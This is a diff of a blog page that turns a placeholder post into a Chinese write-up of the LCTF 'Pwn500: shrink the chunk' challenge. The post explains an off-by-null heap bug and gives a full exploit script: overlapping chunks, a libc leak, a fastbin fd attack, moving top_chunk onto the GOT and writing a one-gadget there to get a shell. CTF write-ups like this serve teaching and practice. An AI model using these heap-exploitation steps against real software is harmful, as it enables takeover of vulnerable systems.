@@ -68,10 +68,12 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="陈星曼, sy3b0l, windcarp, cxm" />
+  <meta name="keywords" content="Pwn,CTF," />
 
 
 
+
+  
 
 
   <link rel="alternate" href="/atom.xml" title="Sy3b0l's 自留地" type="application/atom+xml" />
@@ -86,16 +88,28 @@
 
 
 
-<meta name="description" content="This is a test blog for me.">
+<meta name="description" content="这是一篇测试博客。
+
+XDCTF是国内比较经典的一个CTF了，今年改成LCTF，中间发生的一些剧情也是令人唏嘘啊，有兴趣的可以去知乎上搜一下。那首先来看这个题目吧，这题综合考察了heap内存管理，shrink the trunk，fastbin corruption， magic alloc和onegadget，还是比较复杂的。
+
+题目分析首先，题目的结构大概如下：123sender    re">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Test Blog">
+<meta property="og:title" content="Pwn500：shrink the chunk(lctf)">
 <meta property="og:url" content="https://windcarp.github.io/2016/12/27/Test-Blog/index.html">
 <meta property="og:site_name" content="Sy3b0l's 自留地">
-<meta property="og:description" content="This is a test blog for me.">
-<meta property="og:updated_time" content="2016-12-27T07:28:28.000Z">
+<meta property="og:description" content="这是一篇测试博客。
+
+XDCTF是国内比较经典的一个CTF了，今年改成LCTF，中间发生的一些剧情也是令人唏嘘啊，有兴趣的可以去知乎上搜一下。那首先来看这个题目吧，这题综合考察了heap内存管理，shrink the trunk，fastbin corruption， magic alloc和onegadget，还是比较复杂的。
+
+题目分析首先，题目的结构大概如下：123sender    re">
+<meta property="og:updated_time" content="2016-12-27T09:56:01.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Test Blog">
-<meta name="twitter:description" content="This is a test blog for me.">
+<meta name="twitter:title" content="Pwn500：shrink the chunk(lctf)">
+<meta name="twitter:description" content="这是一篇测试博客。
+
+XDCTF是国内比较经典的一个CTF了，今年改成LCTF，中间发生的一些剧情也是令人唏嘘啊，有兴趣的可以去知乎上搜一下。那首先来看这个题目吧，这题综合考察了heap内存管理，shrink the trunk，fastbin corruption， magic alloc和onegadget，还是比较复杂的。
+
+题目分析首先，题目的结构大概如下：123sender    re">
 
 
 
@@ -129,7 +143,7 @@
 
 
 
-  <title> Test Blog | Sy3b0l's 自留地 </title>
+  <title> Pwn500：shrink the chunk(lctf) | Sy3b0l's 自留地 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -266,7 +280,7 @@
             
             
               
-                Test Blog
+                Pwn500：shrink the chunk(lctf)
               
             
           </h2>
@@ -291,6 +305,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-Pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-Pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -328,8 +364,23 @@
 
       
         <blockquote>
-<p>This is a test blog for me.</p>
+<p>这是一篇测试博客。</p>
 </blockquote>
+<p>XDCTF是国内比较经典的一个CTF了，今年改成LCTF，中间发生的一些剧情也是令人唏嘘啊，有兴趣的可以去知乎上搜一下。<br>那首先来看这个题目吧，这题综合考察了heap内存管理，shrink the trunk，fastbin corruption， magic alloc和onegadget，还是比较复杂的。</p>
+<hr>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先，题目的结构大概如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sender</div><div class="line">    recver</div><div class="line">        package package package</div></pre></td></tr></table></figure></p>
+<p>一个bss总指针带出来三条线负责管理。</p>
+<p>首先要有一个sender，然后用sender可以去新建recver，新建完之后，可以新建package挂在sender上面，每个结构都是通过链表来表示，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">00000000 package_node    struc ; (sizeof=0x20, mappedto_3)</div><div class="line">00000000 next            dq ?                    ; offset</div><div class="line">00000008 prev            dq ?                    ; offset</div><div class="line">00000010 size            dq ?</div><div class="line">00000018 contant         dq ?</div></pre></td></tr></table></figure></p>
+<p>但总结来看，就是提供了一个malloc与free 的接口，malloc的大小小于0x208，然后show是用%s输出。</p>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>输入函数的off-by-null。这个函数第一次看竟然放过去了。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>根据前面分析的条件，利用可以通过shrink the trunk进行。</p>
+<p>其中要注意的是大小，原理是通过修改free small trunk的size字段，使再分配时对下一块prev size和prez inuse的修改无效。那如果再对下一块进行释放，仍然会通过prev size prev inuse进行合并操作，从而造成中间再分配的chunk被大块包含在内。</p>
+<p>接下来，可以通过fastbin fd attack进行，前提是leak。<br>我们通过修改链表指针达到leak libc的效果。接下来重来一遍，进行fd attack。</p>
+<p>这个fd attack要绕过检查，只能使用上一个字是0x0000的0x7fxxxx的地址进行。假设0x7fff地址是addr，则我们需要输入addr-0x3-0x8才能达到使用效果。</p>
+<p>那么问题又来了，因为这里题目会在新分配的块写上0x18的东西，相当于后面的0x18之后才能覆盖，寻找malloc_hook, free_hook, got_table均不行。</p>
+<p>随便在附近看看，发现其实malloc_hook hijack后面正好有top_chunk的位置，而且好险可以写低5个字节。</p>
+<p>进行尝试，发现main_arena前面flags，虽然覆盖了但是影响不大，我们控制top_chunk到got_table的位置，成功分配了gottable上面。然后里面的函数覆盖为onegadget，才最终弹出shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">init()</div><div class="line">set_sender()</div><div class="line">to_recv_loop()</div><div class="line">set_recver() #test for off-by-one shrink the chunk to get overlaped chunk</div><div class="line">set_package(0x10,&apos;a&apos; * 0x8 + &apos;\n&apos;) #get 0x30 space</div><div class="line">set_package(0x1f0,&apos;b&apos;*0x8 + &apos;\n&apos;) #get 0x210 space</div><div class="line">set_package(0x100,&apos;c&apos;*0x8 + &apos;\n&apos;) #get 0x120 space</div><div class="line">set_package(0x1f0,&apos;z&apos;*0x8 + &apos;\n&apos;)</div><div class="line"></div><div class="line">del_package(3) #free 0x210</div><div class="line">del_package(0) #free 0x30</div><div class="line"></div><div class="line">set_package(0x10,&apos;a&apos; * 0x10 + &apos;\n&apos;) #get 0x30 and change 0x210 -&gt; 0x200</div><div class="line">set_package(0xf0,&apos;e&apos;*0x8 + &apos;\n&apos;) #get 0x110 from unsorted chunk</div><div class="line">set_package(0x10,&apos;f&apos;*0x8 + &apos;\n&apos;) #get 0x30 from unsorted chunk, our target chunk</div><div class="line"></div><div class="line">del_package(2) #free 0x110</div><div class="line">del_package(2) #free 0x120 and get 0x120 + 0x210 space</div><div class="line"></div><div class="line"></div><div class="line">link_header = 0x6030B8</div><div class="line">show_target = 0x603090 #stdout / stdin to leak libc</div><div class="line"></div><div class="line">payload1 = &apos;g&apos; * 0xf8 + p64(show_target) + &apos;\n&apos; #over write 0x110 | 0x30 here</div><div class="line">set_package(0x1f0,payload1) #get 0x210 space and contain the &apos;f&apos; 0x30 chunk</div><div class="line">data =show_package()</div><div class="line">t = data[data.rfind(&quot;length:&quot;):]</div><div class="line">leak_stdout = int(t[7:t.find(&apos;\tcontent:&apos;)],10)</div><div class="line">leak_libc = leak_stdout - offset__IO_2_1_stdout_</div><div class="line">malloc_hook_libc = leak_libc + offset___malloc_hook</div><div class="line">onegadget_libc = leak_libc + off_onegadget</div><div class="line">target = malloc_hook_libc - 0x3 - 0x8#prev 0x7f and -0x3, chunk ptr -0x8</div><div class="line">print &quot;leak_libc: &quot;,hex(leak_libc)</div><div class="line">print &quot;malloc_hook_libc: &quot;,hex(malloc_hook_libc)</div><div class="line">print &quot;onegadget_libc: &quot;, hex(onegadget_libc)</div><div class="line">print &quot;target: &quot;,hex(target)</div><div class="line"></div><div class="line"></div><div class="line">set_package(0x100,&apos;h&apos;*0x8 + &apos;\n&apos;) #get 0x120 chunk and leave</div><div class="line">back_send_loop()</div><div class="line">back_loop()</div><div class="line">init()</div><div class="line"></div><div class="line">set_sender()</div><div class="line">to_recv_loop()</div><div class="line">set_recver() #then use fastbin fd attack, attention we need 0x70 chunk and overwrite it with onegadget</div><div class="line">set_package(0x10,&apos;a&apos; * 0x8 + &apos;\n&apos;) #get 0x30 space</div><div class="line">set_package(0x1f0,&apos;b&apos;*0x8 + &apos;\n&apos;) #get 0x210 space</div><div class="line">set_package(0x100,&apos;c&apos;*0x8 + &apos;\n&apos;) #get 0x120 space</div><div class="line">set_package(0x1f0,&apos;z&apos;*0x8 + &apos;\n&apos;)</div><div class="line"></div><div class="line">del_package(3) #free 0x210</div><div class="line">del_package(0) #free 0x30</div><div class="line"></div><div class="line">set_package(0x10,&apos;a&apos; * 0x10 + &apos;\n&apos;) #get 0x30 and change 0x210 -&gt; 0x200</div><div class="line">set_package(0xf0,&apos;e&apos;*0x8 + &apos;\n&apos;) #get 0x110 from unsorted chunk</div><div class="line">set_package(0x50,&apos;f&apos;*0x8 + &apos;\n&apos;) #get 0x70 from unsorted chunk, our target chunk</div><div class="line"></div><div class="line">del_package(2) #free 0x110</div><div class="line">del_package(2) #free 0x120 and get 0x120 + 0x210 space</div><div class="line">del_package(1) #free 0x70 &apos;f&apos; chunk</div><div class="line">payload2 = &apos;g&apos; * 0xe8 + p64(0x110) + p64(0x70) + p64(target)[:-1] + &apos;\n&apos; #over write 0x110 | 0x30 here</div><div class="line">set_package(0x1f0,payload2) #get 0x210 space and contain the &apos;f&apos; 0x30 chunk</div><div class="line">set_package(0x50,&apos;h&apos; * 0x8 + &apos;\n&apos;) #get 0x70 &apos;f&apos; chunk and turn to &apos;h&apos;</div><div class="line">attach()</div><div class="line">back_send_loop()</div><div class="line">to_recv_loop()</div><div class="line">set_recver()</div><div class="line"></div><div class="line">payload3 = &apos;\x00&apos;*0x4b + &quot;\xf8\x2f\x60&quot; + &apos;\n&apos;</div><div class="line">set_package(0x50,payload3)#get malloc_hook_chunk and set top_chunk to 0x602ff8</div><div class="line">payload4 = p64(onegadget_libc) + p64(onegadget_libc) + &apos;\n&apos;</div><div class="line">set_package(0x1f0,payload4)</div><div class="line">cv(&quot;your choice : &quot;)</div><div class="line">sd(&quot;y&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -350,6 +401,14 @@
 
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
       
 
       
@@ -418,8 +477,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
@@ -439,7 +507,21 @@
           
 
           
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
 
+          
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
           
 
         </nav>
@@ -468,6 +550,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞"><span class="nav-number">2.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">3.</span> <span class="nav-text">利用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
     </div>
@@ -577,7 +675,7 @@
       var disqus_shortname = 'sy3b0l';
       var disqus_identifier = '2016/12/27/Test-Blog/';
 
-      var disqus_title = "Test Blog";
+      var disqus_title = "Pwn500：shrink the chunk(lctf)";
 
 
       function run_disqus_script(disqus_script) {
